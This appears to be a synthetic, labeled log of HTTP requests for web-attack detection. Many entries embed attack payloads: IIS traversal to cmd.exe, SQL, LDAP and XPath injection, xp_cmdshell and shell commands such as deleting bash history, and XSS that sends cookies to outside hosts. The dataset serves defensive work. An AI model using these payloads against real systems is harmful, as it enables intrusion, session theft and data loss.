GET,/OOcopy/ted1nteE/rZ1MKt8b3nG/Isooqt8e0tii0r/anaqceDt.aspx,HTTP/1.0,18.62.215.51,0,QpHz=92&uajo61heedE=hanes&Afe=35&nnazemhsitO=bs2Okuj
GET,/sR5TAbCA3f0/gx_QNZi_QsR95s0L@lh/t0hmqashtsehirIee8/cHo/c1TO7j1ZfcORjEc.mspx,HTTP/1.1,166.131.109.142,0,1rpats=5931&cTntde1tO2tk=s&uthy=6Qn-qsL-cuZX&IeeksrGwsU8I=e5tasstp7ohdoees&s0txyeTmatpi=oa4Pxer0rl3ganl&tslnaTp4tz=anEyhJpFR8Jj&enaTE15oayop8r=9l%7E&431V5autoexec.d2m=530493521&oa=638&IbJB=309285548&4fT3=ud%28n+ain&ei=emBDApWQ&o0ul3Tmthe6esnr=shnunEbJ&logb5K46F=na
PUT,/eavK2.JCy9Uu6/tlRgMu5.VaaqJ/or/axp_GEE8Mq/aRqsnhs/RvIimg80/neik/S096cu/tZMqF.nJe.asp,HTTP/1.1,www.eddanbwet.de,1,pIhn=iregisaNtuub6stp5a&RX0C=teconiKndubebeaonm&au4uye=74500556&5sOelRa=h>&ladsEreaeRew=atyawhoanoS2h&cn1bRq=280483842&zaeeig=10914737&s0O0=bHxrnpfu4lk|a&fiyemsemd6odt=hAy&frsqmn=gi9s&se9pit1yriTgsja=tgt
GET,/nsdIIP9/pe.jsp,HTTP/1.0,www.iOn9tamu.de,0,likeDf2UpositionPf=graaeeblsaoteqrh&jnxleyayalcOrx=8&catJ5871Nk=7209566100&tndar9nnehn=u8yIahxuRlanee&ogeeow=xht1eohlT&vKCnph-=8732&Te3=%3At7&htTeeempnel3lee=ramaihSstTac9e%3E&nonnor6th=y%25uPln&lJsystemaTv=wofy1
PUT,/ll.nsf,HTTP/1.0,28.128.234.178,0,osrtlv=ba&oa1=ne&teing=noad&NfunHuofe=gb5bhdxi1aenf&5kPZD84=tkSKAEQppZrL&ia0iieaooona=ologCa&orosgkanyuy=h4aIxE@.D3z&og4=ytscre~rcopenmeyhah&tnhenvr=w_OW-I&nicrcSeee=ezbgs&IrkX=2t0bg&9l6t2toemikbn=En&uafnqan=dij
GET,/lwAaQW/uO6XA-E9f.shtml,HTTP/1.1,www.w4ea.uk,1,so=wtA&0dllennreo=Oxjmu&tPd=775&SwrNm0E=rsh&k7Ta4mxzoc=eign33vall8pn&toy=ns&tVtYWOAsCLZk=chaOwse2ottowk%401bshutdownls&uaeout8orbo=41&F9Wr_=ia7atsi6qwuaolo&orhoFqdw=%2Fsock_stream%26+&czmW8N=02&2laatueRtnsjv=+oeae&mRPSD=%29+++%28+++%7C+%28zzi%3Dnm*%29&a1o83NQhr=xEiphphtpassgIngi&wadomRa=aIHQU8Fg
GET,/tUPoq/h@og8iYGsgE/vyJd436boot.inig@WT/oworepWe4/rjstyleT0y9evOWd/cfh6tazallmn8sdn.aspx,HTTP/1.1,61.213.230.239:489,1,4ship=lscriptw&nt=ipUJ1d%40CCiLn&feoEheyta=iieg&aavtPehsfunnvbo=ta%2Bliredcoqe%25&G9VJ=9999654&X.YpsKoE4Ks=p%7Cwrb&Lkctnioasass=%29+++%28+%7C++++%28displayName%3Dhad*%29++++%28name++%3D++had*+++%29%28++++mail%3Dhad*++%29&NtttatrE=dnubinF%7Cake&ilmns2y2ca1y=isCasnaem5&DimS3RCMYDCE=63392&AFh0@Vl3hkM5=79784556&7ih=e_%40vIu.xljj
GET,/scripts/..%2f../winnt/system32/cmd.exe,HTTP/1.1,62.28.221.119,1,/c+dir
GET,/uaacme/-DD2m/ptx.dll,HTTP/1.0,www.g5irceu.be,0,imev=+CUiyt%3Eiei%3Cac&ieos46rna3=asseehH&udwhi=e42axseese&htlb4itxiieE=tgs+ArD%2F&gPpl9=oejbs&tbatcn=7
GET,/nAEkDcsLCICiTugrAN/sTnxaymsiad4tt/8y.bin,HTTP/1.0,www.ee70ot.net,0,x3KLZ=96136
GET,/aJTrk3dtbGSrRXctls3/b33wS_/ool77R/hBrp0IoNfmsYSjeyS/mk63fRKRgl0HdwiQdJX/rCEEH6nxb91uJHIkR@.mspx,HTTP/1.0,www.eoirwCr.com,1,aooaetnmnecg=1089&Jm3VbCdWETS=ywehtacces%29eat5&ju7ehAFuXE=n&body2.hbodyW=155554&wdrs2Aem=1e0+gtcefEaoptayt&aR9styrdeaRlIg=nc%24d&tkotn=75645680&optOrmp=5-rn+iincludee+%3Eecho+princludesto&teaa2=odSnysuauo&DXwMtyffpyJB=zeSmlu%3Ddccpassthruz&a9cea=tdgD&eued=095&mMPSYEtqc=8&9jMZyeF=%27+++%3B++rm+++++%7E%2F.bash_history+%3B&whns=v+mail
POST,/nDjKcwC1H6tgdMQ02a_W/rawonw/0eoyo9fA4noIo6ueecp/uDrssesattyvAstjosyt/fHoXfNE8X661a_Z6a2eC/2SLA8kWhtFaM2khZGGcv.pl,HTTP/1.0,www.nrEtr.cz:1,0,Sdan=hatsh0srdhnueauot&zeieOe=9&enhsTo9asel=GworgnkfotntetEr&tykou0=ld1rcuvr&mmedsBiNye=Ecsnbnnubcrs&xo=i6W&S9=hh9RMou&2z.LmXGLecho=kaneftpsinDsscriptolh&9n=boMtgnda&iotOnpieit=t7erEbx5 xxmldododa=ebody&gieTttaaedoi=ha4y&dxml4K0iXH=ecattsmetar:asac[jh
GET,/oiTczfoailtrnetgH/Mtn1wlicagd4dni/mN8nzCntbawaigid1/dOqOt4dcg4i8Ibzyh/h9/HExaK-/sk2oaoerUncnonaHnntu/aEQvu.jpg,HTTP/1.1,www.efieei.ch,1,4hu63a5pnivaT4=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29&rettf=g+20as2twe1e2+&jalsiepcegybbfh=ynmeta%2Fpla&idu=jyU7EYOgobX&os08f5ad3eoonog=4v&irgsee=eue0&irhrihsdndqkd=5
PUT,/MhavingIAy.S0oechoj1/aoD.zPN5Jpassthrunode8/4ERXgTU4Z/zW/SsobneeakaeiuHteaEtc.shtml,HTTP/1.0,www.wts4aesbt7.it,0,aenol9nliLe=94025065&nzic4msc=ntero&feEoShb=$5bgsound&et=mn te&Xindiezcytak=dnuaanyppowNcan&mXywDeQli=e7idfe7u8&wJ2XWjV=7syOemnu3&9t4i0a53nkoya7=oazgTJ&PpppsR=t&jneihec3eohTdae=hwOia6breplace&1Ent=ixugrtnhramahi&tra8Rde0=EMpkx
GET,/Tet7AsS4ehaaUuebtLo/eeae/uoreeavohrtbZdnja2/l7fne9pWpElO00G3Fl.png,HTTP/1.0,78.32.145.72,1,fHTAeUFmHn=exec+havingEs&Y5QvOCiByY=2ts+++onload%3Djavascript%3Aalert++++%28vqiRtn.nEl%29
GET,/tbF5X05FFiC3z/n8Uyxsaibeoms4r.aspx,HTTP/1.1,www.ftnsl5lnii.biz,1,euatuaAF8hlae=1657+++++or+id%3E3+++++or++ls_id%3C302
GET,/hK/vbscriptT/mute7matimmenb7c/xhmIe/vlogUGnc/notapeeoAr/dpb_FY@nriLFriflT2x/sO_/uZF2CmNOqz/estoah/aeXpny/8EdPE.aspx,HTTP/1.1,www.dolFsii2op.gov:80,0,iitixwAheeu=02645854&iPtar=jmeta&hSgbrdtezcbr=qesoilteht&54pmhtlafe=la4valn&eraIo0atti=+
GET,/is0opgqgoH/s9rjlauhkleoaen4/g7@evdaY3o@dqwbu/yDlOj1E@Rl/CxeNtmlyrxio6ur/d8srw__Aa4U/rhnt3.tiff,HTTP/1.0,217.132.88.13,0,F3Li=hp&7q4nmhoeery=nnnatenhomefo%3Aewm%26divo%7C&nsify=ah%3D
GET,/rN0GlIaLY-JtzvcnR9e.shtml,HTTP/1.0,96.134.29.158,0,aereeeKUlhhlni=ntveior4oc&rEgroup by2Le=210&to0a=07921&dtinutt=N%28&ee5nbfee=+9A&ieteo4sos=7918588
GET,/twtfgeAyflnae7thed/eakC.X33/m2tr/NLftp7r_enBXCJif/cz/onPrm8thiteunTsv/tLmbt9Y1QsobdZOJj5Y/iohHmI/ojFPEAtp/yYUUtH0cutup1.css,HTTP/1.1,www.h1thioerf.biz:80,1,eoie4sth=cmathpaaZtaanha0&m8mamaaewtrlo=aNHS-kGui9Pe&qioh=899130&teranoroE=1622260&ruTr=ieG&s8e6etfrhnts=2&ar9nAgvseftuitT=ls+-las+++++%2Fhome%2F++%7C&dXn=47&olww=tidcrsnhposition37&sietom8dNthtma=+%24%25&lyetW=rar8s&Fompfi6tte=nerotiAIdPeo&el25f=hpcH67%40haZ&hrsd=e9r
GET,/Vf9HjiframeA/adminvFb8SaF_j/9aw8rabeh8as/3eWED/amJS/RyQrshutdownprocessing-instructiony_iG-xe/euicteFLurticw6lr.php,HTTP/1.1,www.7ahO.st,0,padcybauz6tr5s=d-a%28r&efuia=28161&Tdazoh1=roecs&Eaybuoi=0reweea6rr1gtqoe&sJC2p=%25gsit&woSs=niZJn6BYVd&degbohcsn=istczlexchildra+tmpi&Lbei6o3foTeq1a=nqd9se5nlw3+passwdksiedrop%5Ce&h7OjSea8rk=Eesvhc++a3lpe9&I94b=nnsvfaogtE&lesab8i=er&lorhhyesidcit43=w3v0-&hpf=8135978923
GET,/aoEnen/rt/57gEQXM7h_qjE0pc7/nsretgits/u1arlheitc/akdPPzeItchFUbp3KV/dya3YuapagleJXxltf/cj4OYVeM@6igRdS1/6FfnLDfDjdelete/h4Zx0km/srhgwta1nsMmueeb.cgi,HTTP/1.0,68.18.242.88,0,YUHPY8_xYR=iestsnHpHq%3Cs&oreeAownat=winntd&olj=tmp&yrts9i=usMIchhnsi&v9l0Ler=io&imgFHlMKXP6object=164454&X.oscriptN=cCzAUx5&lNtlotbIt=0&Q0uDA=efzsIs%2F0ihwep&me2oohEsnd=urh&dmnsmsae3pgn=y3tMHV&sonreArehPt=svghcwuAs&aphMrhSnnsusoi=kea&ueDnn=mFnoo&ouetnrnoeteatqG=Pibgeodficnkskp
GET,/eqkF@Q/vmmdBrerkSnsbEe/cD1MPDAUNBboCO/d4gS/7cAloqNneittjeseD/siHuharht93wtrrne/mlee/b@hzW3StyYpu0VtLZI/lrtbhishGosjmdSxarhe/.Zmblike3Htl_Qd/aergl/ssaGhdiie.png,HTTP/1.1,95.48.241.231,0,gfe8pffheazs=ohbV&@elpasswdaC-7xmlQ=ce%25u&eow4ig0xr=scriptechohosecnAxml1&n8h=%28%5Doio-c+0ailti8xi&5U1QIbody=n%282+&K.bDRL5=e%5Cc+h&vo=026&yZ0TT@4TGdS=94943219&yeob6r3edezzax=t.Op6awU&enadnyleejaa=n6yubnya3cmo0b&onv=ne&aabmctra=Fdocument&vgtGrni=mrU&all-SI3=0
GET,/oruqrt6henisteMvistj/altxn6ra/wuV9SJ.KadminAanxi/eco9tluimaesbinie3sy/uQD/dtagzseolL7n/pR4hsaes6ZrEid/eIxmVy3fEnqbmTG/Xlda/evOHqDR5c2kcKn.mspx,HTTP/1.1,140.219.164.47,0,0OCImocha_AY=+&nirPieeovh4=caeaomhtoc2gees&earS8=hzSfqAou&eDEiewinp=ds5%7C60dmia0s&poo=E&km66A=hhTaethiseaenyoctt&ipn=8739486
GET,/kHJd5gd2G._LVtelnetu/wi5rdn8layodtt/eocrnaECyhrtyoa5zvs/hgzcu7Mof8rudrre8eqe/leGeatpeptcs/ecTho5rOrotS1aiitQw/scriptlocationwFGheplq2/FMS9gDM.cy.jpg,HTTP/1.1,www.ntunmekpe.gov,1,tdddmaprn=tenhenena&M1jz4f@bh=tv2JfNkH&htpwu=nxW&dhttpyF-H2XJ@bin7=9427&isu8ecllhneayee=%3C%21--+%23odbc+connect%3D%229e%2Ced%2Cno5sm%22++++++++statement%3D%22select+++++*+++from++++rca%22--%3E&ioeniE=o+4%2B%2Be&atwAsbiy=iaerncntdtnml&odte=lehty&teaenqa=sgFqUIwaetMR&4pcavq=6382579
GET,/naGafstotnl24mtdg/v.fa/okV/e_Cn-/Likceaet1c/prduM/xconwtezaDmkgk/au8thWePHs9ntntzwe3.tiff,HTTP/1.0,229.186.218.118,1,Ams7AW=saatUiIoIro9xlrec&n8UWtT=%3Biiol&aoytLtmY6ssA=%3Cxml+id++++%3D+%22+++X+%22%3E%3Ca%3E%3Cb+%3E%26lt%3Bscript++++%3E%5Bwindow.open%28%27http%3A%2F%2F115.205.235.145%2Filtoas.bin%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript++%3E%3B%3C%2Fb+++%3E%3C%2Fa+++%3E%3C%2Fxml%3E
GET,/lTHl1uXZS@P/hf4/8nnadefhabsezhgTt/byOlU9NW/eciilxdrpehigne/AAW.-c4btz.cfm,HTTP/1.1,www.cxrntabne.biz,1,snileeft=185613082&X59mailsnF=nle&ge9atnghtcteopy=n+yosock_streamktelrdM&tf=89Ldrayvfn0emhn&GV3_MAF=%7Cns&ilw=9tnajeaadminnesh&Tchskfao=%29+%28+%7C++++%28cn%3D*o%27brien*++%29%28mail%3D*o++++%27brien*++++%29&wtm=ymv1mnsaxj&mtG=%26ngtNn&soet6eka0lwStna=ezlc&mEhzYea2=cJoi2passwdmn8ts
POST,/oOonesidd1ndbsitpsoe/vte/CaedJSaueetseinere/fR5MxB_Fn4HXy/ean9etE7n2aS/YJ/06Kpiha6S/PmetaqW7Nm-hUM_zwk.css,HTTP/1.1,www.uelsePcers.uk,0,eixp9t0tenutnL='oeLdiv&.UT5kidimgP=evoecspo8%Oumme5i&iw2oIhe=m7n &fntrmeo=aeq&ASSbW2=ttm me
GET,/2uhu3ecst/zttdssNoddn54o8oolSt/eieceeyng/rogoPCtC2sg@SgTTg41/AnqpA/vn9tiiIqsnterbetys/osrh0bwm7hwhSian/moOtSFnwAZoM2l/ye8VtfSv3vo_.asmx,HTTP/1.0,www.mhhar.ch,1,jtrh=50735&olov0gh3Emnisrn=43019496&c3Ed=5164751&rzNeC=S%2B%3Dr&FaGmetalcfN=4&Dncrabe=29&tsrhwed=25430917&atVthrnmrloian=doc%28+file%3A%2F%2F%2Fc%3A%2Farm%2Fhemw6s.xml+++%29&o8fSOeN=TroalikedthoioN&I7aqsyhtihr1sxp=%280uLi%2Btrttboot.ini+netcatsi3d&dan9ibzpiurk2ln=9522577&l2ii9scce3od=7064
POST,/ikM4UA/yAnqsufbtrs9/bgdt/libeTvG@window.open/xEo.jsp,HTTP/1.0,5.249.240.72,0,3eeoib=hniuqp2eycme&s4kkctb=69&boeafi7=ieatj&u85ssier8=ieindRa&pRetzxe2judc=56836&nh=2634819&tkfe=us&hr=92731&oetonstnv=400717
PUT,/cqFQ/iKY6e0inhMDVY/httpqwJBwCTyB/t9s/vr6eW@/Iszq/ekohl/e5tum8hrkeettovv1s/8exMA0bMOp1bgsoundW-L/bI4/eQXSEO8eS.exe,HTTP/1.0,144.133.195.64:80,1,535oEank=ixtTsC'   or  Sp1/a1/child::node()[processing-instruction()=6]    or  'eNI'  = '&yejiuy4qzlbn2e=p &rice7cvesesccf6=38&nraphedfeo4eB=lfDW&mkntmewahmfio=56210&at1aauaqyao=iAIe4bcyq1moE4&edDdttsro=c3bry6&pnMNVJbhttps=770724&iqEupdatebgsoundel=loonteed&ce9aTjnopeuaa=0ZLmd-t
GET,/_mem_bin/..%5c../..%5c../..%5c../winnt/system32/cmd.exe,HTTP/1.1,94.145.36.220,1,/c+dir
GET,/9WM/ewyteTm8Esn5iEtas/ftaAsbqpxithesbf8g/hE3ICiP/rQO3Ns_3_As.4NNK7npH/n2e.jpg,HTTP/1.1,180.51.111.82,1,Dn=eeuHotzkhwynd+macceptk&frnuulec=osvvifitdEmlhkt5&nehsAehiasEfpt=556634&igJvTyTdi-=ewrogkerepr&iecbJ8a=49.155.48.212+%7C++++dir
GET,/tASYT1yG2rs./oseO1aniu727e9/wp-ThuF7bEOW@/pItexPa5@PBR/eltmsnSci/alaznlistnonfehfnosv/snrmasnreee4/eh94vsuoeeieEI1is4l/e@NVdGC58JZY_8Vk1/taWMYkNTqv/O1fL9k1rCR@c.png,HTTP/1.1,www.g2Sq00.cz:53120,1,SpVssesmaz=%22%29%28targetfilter%3D%28o%3DNetscapeRoot%29%29
GET,/lVEU7QmOHMP/aCCY35oFqnV/oQk6IV-Kqa/ernee/olGySMuJformjOuid.php4,HTTP/1.0,57.48.223.77:80,1,usth6en4=nxR2dsthtri&lpeshO3fhe=ttyoe9dm%3A%40N
GET,/_vf8jYrj@QLlphtpass.bin,HTTP/1.1,www.itate.fr:80,1,dgeu=%3FeruaNdwecsdNr&sIee=buD5cbh0dfg7wgD%3Fc&WILeqBgbt45=661&z2aoAii=8174746561&UUnetcatEe=cr+1a&Je1ubscAxnsc=yueItau6gC9oe&H9a7SnnnisElsla=etta7&aad=.%2F..%2F.%2F..%2F&1cy3shxeorntnf=ttu7e%3Faiets+&inwir=ie&5Smu=or+a&9elsplsTgoesb7=2726885&t8mxNnysmy=2yRt54mv_6N
PUT,/aR-7kheZckaK.sh,HTTP/1.1,106.128.179.218,1,fE7urulTloinVe=rs31s&Eprocessing-instructionYpF=538291&hg0nsh=ili' or   count(  path/child::node()[position(   )=((    i  +j    +  k+l  +    1)]     |  path/child::*()[position()=(k+1)])=1  or    'ou'=   '   rno'    or&nEhtenentoau=ht&ttygNiSishsteeb=eaoaky
GET,/rh.htm,HTTP/1.1,www.nterh.fr:80,1,eeOa=frlnmarshormec&aittnh5wdbh3dta=4s+%25&ft=dreiihuMo5&CXb6wfG2sS=52nzwtE&rsi7otEeh=xacdocument8heiunionssts&wsSg3autneal=326&h6rr=%28nOtnm&lntrA=74960890&nHqtessw=waasgieapnnpzZlr&laEoao2m=pfgejs&Rcts2Ftrru=2888875&zLttefvslhz=4540376330&nrski5dpi8=O5elUxir5o6uh
GET,/vjmsfM1rewoTpoe/eL@ArYPqvNWzUkW9nf.cfm,HTTP/1.1,www.h21d.it:22862,0,k1naanSna=connecttlo&_2ymB3bbin=09631
GET,/afgLCkcW7pAMT_HOWjB/-oJJ8krYfhomer5NF/tv/gsLgfn0es/ZD3m/ZJ/KCbptmp-tMb3/uKasNv4wS/reISz0v/tGFKXQS/8XaQS5biH3lTODGv5l.htm,HTTP/1.1,www.alcd.org:80,1,a8xrsieeIetfo=dGgfZGWn8.9&ec5dliiiOritei=472&dleuesehj=560&lcfa=%3Cxml+++++id++%3D%22+++X+%22+%3E%3Ca+++%3E%3Cb%3E%26lt%3Bscript+%3E%5Bdocument.location.replace+%28%27http%3A%2F%2Fwww.ieient.com%2Fcgi-bin%2Fllesli.cgi%27%2Bdocument.cookie%29%3B%5D%26lt%3B%2Fscript++++%3E%3B%3C%2Fb+%3E%3C%2Fa+%3E%3C%2Fxml+%3E
GET,/mF2tneIoE/A8CixRWK6T/eAvIeqfTn.JEBM_OFq/oQ1t/pcnado7ra2v3xupoyobh/axtStgirboc5/83kvbodqynqfromCp/Gedt.msf,HTTP/1.0,www.srfdndtuq.st:80,1,gn92nhmn=i0&IvN8Rmrl=olimmE8toem1tritwL&ste3inse=exec++xp_cmdshell+%27%22g5ddc8bdr%22+%3E%3E++++script.vbs%27&nainhtj1cnDnei4=kinpa&H223hahl7hewo=r62https%2Feb8eem4e+I%3D4s&82B0T2QMecX=tHt&cae=Mq8%2B
PUT,/f23P@W4c/eY/eKI-NOiVnUuNSRe/jlFN@avVcmDenTGM/AwOhgfeeldDoeh/rbT3gtDZL-py0peHYsh/yehg/sn6.JAuhnK.d/Ucadknniarotn/iylcY-/cO89jIk6g5YsTbu/rnh9detnatIrduitiEu.exe,HTTP/1.0,www.eUjo.ch,0,taoea=61gZL&nHlaasz=BllaSaoeo&rotVtreS73ddwqu=o1s&.MXu7@2aiQperl=btfthtyessutmsSs2&louayehlmnosfw=it&&nRF=01
GET,/..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe,HTTP/1.1,www.paeso.uk,1,/c+dir
GET,/Oq5KhcIconnectcxKQYt2.gif,HTTP/1.0,www.fn8asua.be,0,7MenO4reiiq=hsdmo&vT7ahAeea1anheN=sBe1&tanndiavealq=8435618&aTrfOl8dhtsCcib=nlibm+s&1jP-QKx=t&l-qU4EL9bkp=aloa1wccoAnecfadto
GET,/7vnyoiGh1Enorofreos/Zi9iframecHvpassthruvJv9/deR5S4ger5lctel5/fLpVw_o0szTM/iBrqK1/yji5BO.q0EQQ.tiff,HTTP/1.0,www.Rt0wLen.com,0,S5ed3ege=oH25FcLJ&uzhavbeaia=1&eeaagiitegWciri=nsHjtimmbd7fr6e5vm&ye69rlo3plf8=25&it3dpofO=mddlsoosmz2
GET,/n2/etqe1.E46v9gpt1/-FgF0wgethu85/onChel6rhArrt/cJf7so3xdtP0_7bvDDv9/xV1KDviG_q1W/a2C8qdivXbtM.e/olXBdA2.jpeg,HTTP/1.0,126.236.227.241:80,1,Iiicgntmn=sh5mife%27%29%3B++++DEL%2F**%2FETE++++FROM+users+WHERE+upper%28username%29++++%3D+++upper%28+++%27admin
GET,/u8iu1uctmNtnrttzt/lsGyTop/cb2/nana/aHB3U/a7.K_Q-gyN/dIiu7ntet1phrcamnE/nb81k177Vkh/processing-instructioniPn@Uxe1tKEH/ByOTC7_RV0ac/VhttpfromF/tOhhycwBWnv.mspx,HTTP/1.1,www.tuefanpece.de:6,1,dddan=60&isjlyhetjsyxe1s=Yo%27%2F**%2FUNION%2F**%2FSELECT%2F**%2F5ri%2F**%2FFROM%2F**%2Fdba_users%2F**%2FWHERE%2F**%2Fyhgotz%2F**%2Flike%2F**%2F%27%2525&iwentxelyi=oetgCelAyea8hlrga&efU6qtaa=lzp&ls93mtron=3hnesnHohheiahepts&tdirRanjauuam=enp+%29%7Ed&alks=76te&7ohn6=%29a&scriptb3D=lT&lfjrtt=yqZqL_B21&adyr=%2Bmllru&Leet=%26de&5fhudsjnh=61&oIbbnoaaa=dwp-nddns%3AHI7shutdown
GET,/sa/aZPpvalU5cU/doP/tnrqLtu4uahewzuaeiim/UQlogGruMVeU/sasos5es/rpocatolRu8to6zii/ngbTYF6tNrHZbgj.asp,HTTP/1.1,93.91.153.139:536,1,len=doc%28++++file%3A%2F%2F%2Fc%3A%2FN6ael%2Frtdmnosf.xml+++%29&8DyIgscriptxcopy=ascriptce&HgEeejdeNae=-sps&thhakdnhTegdtht=34899609&b5a=lfUcU
PUT,/mg8H409@7pvVT.html,HTTP/1.1,www.egdA.be,0,rdiats=ap &o8slhen=~&eanehy=9033&ii3Q=48546752&lhe4hWleomeor=1&whereDowDqautoexecaccept=ySWxWwWlVvL&stO23=peiece2eg&eosdnnjlehipde=uMs4R__p&itaSry=lT8ti6tzTsV&hotenenttnrrs=trgXmla06ss&bIeJPPi=0504
POST,/Ttelnet9.jOF1tZqeR/nt28AUOfoyKLOnv/ouu7zfacar0i53/nyWwpvMIKUmAe1nFO/tIrI0varpassthruw/m4Xf4JxMkxbjITr0.0R/RcHH.C_wget-kalsWB/rrarask6oralMr8rtm/typn1thSbkmrze5m/ytsha8rcet/aS.mdb,HTTP/1.0,116.121.51.126:80,0,atsmsucm=iFR&kr=e00
